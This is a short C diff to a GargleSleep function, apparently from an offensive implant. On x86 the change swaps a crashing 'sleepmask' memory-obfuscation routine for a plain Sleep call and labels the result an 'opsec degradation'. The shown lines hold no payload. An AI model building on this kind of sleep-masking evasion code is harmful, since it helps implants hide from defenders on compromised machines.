@@ -43,6 +43,13 @@ void GargleSleep(DWORD time) {
 	if (gen3_sleep(time))
 		return;
 	g3_log("gargle: gen3 fell back to official path", 0x7fffffff);
+#else
+	/* x86: the official 4.5 sleepmask BOF crashes inside its blob in our
+	 * WOW64 layout (round 18: first-chance rip=PRV(3B30000)+0x3b). Until
+	 * the x86 own-table battle lands, degrade to plain sleep - no crash,
+	 * opsec degradation only. */
+	Sleep(time);
+	return;
 #endif
 
 	decoded = (char *)malloc(16384);
